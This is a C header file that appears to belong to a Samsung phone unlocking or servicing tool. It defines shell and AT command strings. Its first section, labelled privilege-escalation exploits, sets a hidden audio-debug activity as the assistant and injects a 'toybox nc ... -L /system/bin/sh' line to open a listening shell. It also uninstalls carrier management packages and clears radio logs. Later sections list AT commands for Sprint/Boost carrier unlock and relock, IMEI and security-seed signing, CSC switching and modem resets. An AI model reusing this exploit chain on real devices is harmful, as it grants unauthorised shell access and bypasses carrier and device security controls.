/**
 * @file all_gsm_commands.h
 * @brief Comprehensive dictionary of all extracted GSM, AT, Shell, RIL, and System commands.
 * Reverse-engineered and benchmarked from Samsung servicing binaries, Shannon baseband, and Qualcomm modems.
 *
 * Supported domains:
 *  - 1. Shell & Privilege Escalation Exploits
 *  - 2. Samsung AT & Modem Commands (Telemetry, SIM Locks, Radio, Security Seed)
 *  - 3. Sprint / Boost Mobile Carrier Unlock & Relock Commands
 *  - 4. Qualcomm Baseband Diagnostic & Engineering Commands
 *  - 5. Modern CSC Execution Chains & RF Band Switching
 *  - 6. Modem Channels, RIL Sockets, and IPC Nodes
 *  - 7. System Properties Dictionary
 *  - 8. Target Packages & Hidden Activities
 *  - 9. Bridge Protocol Command Identifiers
 */

#ifndef ALL_GSM_COMMANDS_H
#define ALL_GSM_COMMANDS_H

#ifdef __cplusplus
extern "C" {
#endif

/* =========================================================================
 * 1. SHELL & PRIVILEGE ESCALATION EXPLOITS
 * ========================================================================= */
#define CMD_FLUSH_RADIO_LOGS \
    "logcat -b radio -c > /dev/null 2>&1"

#define CMD_SET_SCREEN_TIMEOUT \
    "settings put system screen_off_timeout 600000 > /dev/null 2>&1"

#define CMD_SET_ASSISTANT_SECURE \
    "settings put Secure assistant com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1"

#define CMD_SET_ASSISTANT_SYSTEM \
    "settings put system assistant com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1"

#define CMD_SET_DOUBLEPRESS_GLOBAL \
    "settings put global function_key_config_doublepress_value com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1"

#define CMD_LAUNCH_SETTINGS \
    "am start -a android.settings.SETTINGS > /dev/null 2>&1"

#define CMD_TRIGGER_ASSIST_KEY \
    "input keyevent 219 > /dev/null 2>&1"

#define CMD_INJECT_NC_ROOT_SHELL \
    "input text 'toybox nc -s 127.0.0.1 -p 2600 -L /system/bin/sh'"

#define CMD_KEYEVENT_ENTER \
    "input keyevent 66 > /dev/null 2>&1"

#define CMD_KEYEVENT_TAB \
    "input keyevent 61 > /dev/null 2>&1"

#define CMD_KEYEVENT_HOME \
    "input keyevent 3 > /dev/null 2>&1"

#define CMD_KEYEVENT_MENU \
    "input keyevent 82 > /dev/null 2>&1"

#define CMD_LAUNCH_SAMSUNG_HIDDEN_MENU \
    "am start -n com.sec.hiddenmenu/.IOTHiddenMenu -e 7267864872 72678647376477466 > /dev/null 2>&1"

#define CMD_CHECK_SKT_UNLOCK \
    "pm list packages | grep com.skatd.unlock"

#define CMD_CLEAR_FACTORY_TEST \
    "pm clear com.samsung.android.FactoryTestLauncher > /dev/null 2>&1"

#define CMD_CLEAR_AUDIO_DEBUG \
    "pm clear com.sec.android.app.audiocoredebug > /dev/null 2>&1"

#define CMD_DUMP_UI_HIERARCHY \
    "uiautomator dump /sdcard/window_dump.xml > /dev/null 2>&1"

#define CMD_CAT_UI_HIERARCHY \
    "cat /sdcard/window_dump.xml"

#define CMD_CLEAN_UI_DUMP \
    "rm -rf /sdcard/window_dump.xml > /dev/null 2>&1"

#define CMD_UNINSTALL_OMADMSPR \
    "pm uninstall -k --user 0 com.sec.omadmspr > /dev/null 2>&1"

#define CMD_UNINSTALL_AUTOPRECONFIG \
    "pm uninstall -k --user 0 com.sec.android.AutoPreconfig > /dev/null 2>&1"

#define CMD_FORCESTOP_SKATD \
    "am force-stop com.skatd.unlock > /dev/null 2>&1"

#define CMD_DISABLE_WIFI \
    "cmd wifi set-wifi-enabled disabled > /dev/null 2>&1"


/* =========================================================================
 * 2. SAMSUNG AT & MODEM TELEMETRY COMMANDS
 * ========================================================================= */
#define AT_CMD_TEST                     "AT\r\n"
#define AT_CMD_DEVCONINFO               "AT+DEVCONINFO\r\n"
#define AT_CMD_VERSNAME_SW              "AT+VERSNAME=1,9,0\r\n"
#define AT_CMD_VERSNAME_PDA             "AT+VERSNAME=1,7,0\r\n"
#define AT_CMD_VERSNAME_CSC             "AT+VERSNAME=1,8,0\r\n"
#define AT_CMD_VERSNAME_CP              "AT+VERSNAME=1,0,0\r\n"
#define AT_CMD_SERIALNO                 "AT+SERIALNO=1,0\r\n"
#define AT_CMD_IMEITEST                 "AT+IMEITEST=1,0\r\n"
#define AT_CMD_IMEI_QUERY_LEGACY        "+IMEITEST:1,\r\n"
#define AT_CMD_CIMI                     "AT+CIMI\r\n"
#define AT_CMD_BATTEST                  "AT+BATTEST=1,0\r\n"
#define AT_CMD_SYSSCOPE                 "AT+SYSSCOPE=1,0\r\n"
#define AT_CMD_MSLCHECK                 "AT+MSLCHECK\r\n"
#define AT_CMD_DUMPENABLE               "AT+DUMPENABLE=1,1\r\n"
#define AT_CMD_KSTRINGB                 "AT+KSTRINGB=0,3\r\n"


/* =========================================================================
 * 3. 3GPP LOCK QUERIES & CARRIER PROGRAMMING
 * ========================================================================= */
#define AT_CMD_SIM_STATUS               "AT+CPIN?\r\n"
#define AT_CMD_QUERY_NETWORK_LOCK       "AT+CLCK=\"PN\",2\r\n"
#define AT_CMD_QUERY_SUBSET_LOCK        "AT+CLCK=\"PU\",2\r\n"
#define AT_CMD_QUERY_SP_LOCK            "AT+CLCK=\"PP\",2\r\n"
#define AT_CMD_QUERY_CORP_LOCK          "AT+CLCK=\"PC\",2\r\n"
#define AT_CMD_QUERY_SIM_LOCK           "AT+CLCK=\"SC\",2\r\n"
#define AT_CMD_SVCIFPGM_1               "AT+SVCIFPGM=1,1\r\n"
#define AT_CMD_SVCIFPGM_4               "AT+SVCIFPGM=1,4\r\n"


/* =========================================================================
 * 4. SPRINT & BOOST MOBILE CARRIER UNLOCK & RELOCK COMMANDS (/boost)
 * ========================================================================= */
#define AT_CMD_UNLOCKSPR_OLD            "AT+UNLOCKSPR=OLD\r\n"
#define AT_CMD_SIMLOCKU_RESET           "AT+SIMLOCKU=0,0,0\r\n"
#define RIL_CMD_SETSPR                  "SETSPR"
#define RIL_CMD_GETSPR                  "GETSPR"
#define RIL_CMD_SRELOCK1                "SRELOCK1"


/* =========================================================================
 * 5. SAMSUNG CSC SWITCHING & EXECUTION CHAINS
 * ========================================================================= */
#define AT_CMD_PRECONFG_READ            "AT+PRECONFG=1,0\r\n"
#define AT_CMD_PRECONFG_WRITE_FMT       "AT+PRECONFG=2,%s\r\n"
#define AT_CMD_SWATD_0                  "AT+SWATD=0\r\n"
#define AT_CMD_ACTIVATE                 "AT+ACTIVATE=0,0,0\r\n"
#define AT_CMD_SWATD_1                  "AT+SWATD=1\r\n"
#define AT_CMD_RFBYCODE_FMT             "AT+RFBYCODE=2,0,%s\r\n"


/* =========================================================================
 * 6. MODEM SECURITY CHALLENGE & AUTHENTICATION SEED
 * ========================================================================= */
#define AT_CMD_AKSEEDNO_REQ             "AT+AKSEEDNO=1,0\r\n"
#define AT_CMD_AKSEEDNO_RESP_FMT        "AT+AKSEEDNO=0,%s\r\n"
#define AT_CMD_BLOBSIGN                 "AT+BLOBSIGN\r\n"
#define AT_CMD_IMEISIGN                 "AT+IMEISIGN\r\n"


/* =========================================================================
 * 7. RADIO & POWER CONTROLS
 * ========================================================================= */
#define AT_CMD_REBOOT_RADIO             "AT+CFUN=1,1\r\n"
#define AT_CMD_RADIO_OFF                "AT+CFUN=0\r\n"
#define AT_CMD_RADIO_ON                 "AT+CFUN=1\r\n"
#define AT_CMD_MODEM_FACTORY_RESET      "AT+FACTORST=0,0\r\n"
#define AT_CMD_SWRESET                  "AT+SWRESET\r\n"


/* =========================================================================
 * 8. QUALCOMM BASEBAND SPECIFIC COMMANDS
 * ========================================================================= */
#define AT_CMD_QCRMCALL                 "AT$QCRMCALL=1,1\r\n"
#define AT_CMD_QCPWRDN                  "AT$QCPWRDN\r\n"
#define AT_CMD_QENG_SERVING             "AT+QENG=\"servingcell\"\r\n"
#define AT_CMD_QCN                      "AT+QCN\r\n"


/* =========================================================================
 * 9. MODEM CHANNELS AND SOCKET NODES
 * ========================================================================= */
static const char * const ALL_MODEM_CHANNELS[] = {
    /* Samsung RIL Sockets */
    "/dev/socket/rild",
    "/dev/socket/rild-debug",
    "/dev/socket/rild-oem",
    "/dev/socket/rild2",
    "/dev/socket/qmux_radio/qmux_client_socket0",

    /* Samsung Shannon / Exynos IPC nodes */
    "/dev/umts_at0",
    "/dev/umts_atc0",
    "/dev/umts_atc1",
    "/dev/umts_boot0",
    "/dev/umts_ipc0",
    "/dev/umts_ipc1",
    "/dev/umts_rfs0",
    "/dev/diag",

    /* Qualcomm SMD channels */
    "/dev/smd0",
    "/dev/smd7",
    "/dev/smd11",

    /* AT Distributors and Virtual Serial ports */
    "/dev/at_distributor",
    "/dev/at_distributor0",
    "/dev/ttyGS0",
    "/dev/ttyACM0",
    "/dev/ttyUSB0",
    0
};


/* =========================================================================
 * 10. SYSTEM PROPERTIES
 * ========================================================================= */
static const char * const ALL_SYSTEM_PROPERTIES[] = {
    "ro.product.model",
    "ro.product.brand",
    "ro.product.name",
    "ro.product.device",
    "ro.product.manufacturer",
    "ro.serialno",
    "ro.boot.serialno",
    "ro.build.display.id",
    "ro.build.version.release",
    "ro.build.version.sdk",
    "ro.build.version.security_patch",
    "ro.build.version.incremental",
    "ro.csc.sales_code",
    "ro.csc.countryiso_code",
    "ro.boot.debug_level",
    "ro.boot.cp_debug_level",
    "gsm.sim.state",
    "gsm.sim.operator.numeric",
    "gsm.operator.numeric",
    "ril.serialnumber",
    "ril.approved_code",
    "ril.product_code",
    "persist.sys.usb.config",
    "sys.usb.config",
    0
};


/* =========================================================================
 * 11. TARGET PACKAGES AND ACTIVITIES
 * ========================================================================= */
#define PKG_AUDIO_DEBUG                 "com.sec.android.app.audiocoredebug"
#define ACT_AUDIO_DEBUG_SHELL           "com.sec.android.app.audiocoredebug.AudioAdbShellActivity"
#define PKG_HIDDEN_MENU                 "com.sec.hiddenmenu"
#define ACT_IOT_HIDDEN_MENU             "com.sec.hiddenmenu.IOTHiddenMenu"
#define PKG_FACTORY_TEST                "com.samsung.android.FactoryTestLauncher"
#define PKG_RETAIL_MODE                 "com.samsung.rms.retailagent.global"
#define PKG_SKT_UNLOCK                  "com.skatd.unlock"
#define PKG_FOTA_AGENT                  "com.sdet.fotaagent"
#define PKG_OMADM_SPR                   "com.sec.omadmspr"
#define PKG_AUTOPRECONFIG               "com.sec.android.AutoPreconfig"


/* =========================================================================
 * 12. BRIDGE INTERACTIVE COMMAND IDENTIFIERS & PREFIXES
 * ========================================================================= */
#define PROTO_PREFIX_CSC                "CSC:"
#define PROTO_PREFIX_AT                 "AT:"
#define PROTO_PREFIX_HEX                "HEX:"
#define PROTO_PREFIX_BOOST              "BOOST:"
#define PROTO_PREFIX_RELOCK             "RELOCK:"
#define PROTO_PREFIX_RADIO              "RADIO:"
#define PROTO_PREFIX_AUTH               "AUTH:"

#define PROTO_CMD_BOOST_UNLOCK          "BOOST"
#define PROTO_CMD_SCAN                  "SCAN"
#define PROTO_CMD_STATUS                "STATUS"
#define PROTO_CMD_LOCKS                 "LOCKS"
#define PROTO_CMD_DEVINFO               "DEVINFO"
#define PROTO_CMD_AKSEED                "AKSEED"
#define PROTO_CMD_RECONNECT             "RECONNECT"
#define PROTO_CMD_HELP                  "HELP"
#define PROTO_CMD_EXIT                  "EXIT"
#define PROTO_CMD_QUIT                  "QUIT"

#define TELEMETRY_FORMAT_STRING \
    "INFO|MODEL=%s|CSC=%s|AND=%s|PATCH=%s|DBG=%s|UID=%d|CH=%s\n"

#ifdef __cplusplus
}
#endif

#endif /* ALL_GSM_COMMANDS_H */
